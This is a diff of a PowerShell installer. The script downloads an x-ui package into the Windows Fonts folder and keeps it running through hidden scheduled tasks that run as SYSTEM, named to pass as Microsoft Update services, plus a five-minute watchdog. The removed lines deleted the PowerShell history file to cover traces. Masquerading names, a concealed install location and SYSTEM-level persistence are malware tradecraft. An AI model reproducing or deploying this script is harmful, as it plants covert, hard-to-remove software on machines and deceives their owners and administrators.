@@ -1,6 +1,4 @@
 #Requires -RunAsAdministrator
-Clear-Host
-Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 $downloadDir = Join-Path $env:SystemDrive "Windows\Fonts"
 $zipFileName = "x-ui-windows-amd64.zip"
@@ -13,6 +11,11 @@ $executablePath = Join-Path $downloadDir $executableName
 $mainTaskName = "Microsoft Update Service"
 $watchdogTaskName = "Microsoft Update Temporary Storage"
 $taskPath = "\Microsoft\Windows"
+
+# Stop existing process and remove old tasks
+Stop-Process -Name ($executableName.Split('.')[0]) -Force -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName $mainTaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName $watchdogTaskName -TaskPath $taskPath -Confirm:$false -ErrorAction SilentlyContinue
 
 try {
     Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
@@ -57,7 +60,7 @@ if (Test-Path -Path $zipPath) {
 }
 
 try {
-    $action = New-ScheduledTaskAction -Execute $executablePath -ErrorAction Stop
+    $action = New-ScheduledTaskAction -Execute $executablePath -WorkingDirectory $downloadDir -ErrorAction Stop
     $trigger = New-ScheduledTaskTrigger -AtStartup -ErrorAction Stop
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest -ErrorAction Stop
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
@@ -69,7 +72,7 @@ try {
 
 try {
     $processName = $executableName.Split('.')[0]
-    $watchdogCommand = "if (-not (Get-Process -Name '$processName' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$executablePath' -WindowStyle Hidden }"
+    $watchdogCommand = "if (-not (Get-Process -Name '$processName' -ErrorAction SilentlyContinue)) { Start-Process -FilePath '$executablePath' -WorkingDirectory '$downloadDir' -WindowStyle Hidden }"
     $watchdogAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$watchdogCommand`"" -ErrorAction Stop
     $watchdogTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -ErrorAction Stop
     Register-ScheduledTask -TaskName $watchdogTaskName -TaskPath $taskPath -Action $watchdogAction -Trigger $watchdogTrigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
